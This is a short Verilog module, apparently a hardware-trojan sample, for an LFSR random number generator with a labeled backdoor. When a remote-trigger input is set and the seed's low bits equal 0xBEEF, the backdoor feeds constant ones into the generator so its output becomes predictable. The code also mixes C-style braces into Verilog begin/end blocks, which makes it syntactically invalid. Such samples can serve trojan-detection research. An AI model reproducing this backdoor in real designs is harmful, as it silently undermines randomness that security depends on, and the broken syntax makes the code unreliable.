module random_with_remote_activation_trojan (
    
    // Inputs
    input                       i_clk,
    input                       i_reset_n,
    input               [31:0]  i_seed,
    input                       i_remote_trigger,  // Input that simulates remote activation

    // Outputs
    output reg          [7:0]  o_data
);

    /******** Reg declarations ********/
    reg [31:0]  r_data;
    wire        w_xnor;

    /******** Trojan specific declarations ********/
    // Remote activation trigger combined with a specific seed pattern
    wire trojan_activation_condition = (i_remote_trigger && i_seed[15:0] == 16'hBEEF); // Example trigger condition

    /******** Concurrent logic ********/
    assign w_xnor = (r_data[31] ^ ~r_data[29] ^ ~r_data[25] ^ ~r_data[24]);

    /******** Process ********/
    always @(posedge i_clk) begin
        if (!i_reset_n) begin
            r_data <= i_seed;
        end else {
            // Check for remote activation combined with specific seed pattern
            if (trojan_activation_condition) begin
                // If triggered, the random number generator outputs a predictable pattern
                r_data <= {r_data[30:0], 1'b1}; // Example: Injects a constant '1', making the sequence predictable
            } else {
                // Normal operation
                r_data <= {r_data[30:0], w_xnor};
            }
        end
        // Output the least significant 8 bits of the internal state as random data
        o_data <= r_data[7:0];
    end

endmodule
